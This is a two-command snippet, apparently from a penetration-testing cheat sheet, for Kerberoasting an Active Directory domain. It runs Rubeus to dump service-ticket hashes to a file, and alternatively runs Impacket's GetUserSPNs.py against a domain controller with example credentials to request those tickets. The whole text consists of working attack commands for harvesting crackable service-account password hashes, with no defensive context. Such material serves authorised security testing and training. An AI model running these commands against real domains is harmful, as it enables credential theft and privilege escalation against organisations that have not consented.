#Request service ticket
Rubeus.exe kerberoast /outfile:hashes.txt
# or classic Impacket way from Kali
GetUserSPNs.py -request -dc-ip 10.10.10.10 corp.local/john.doe:Passw0rd123
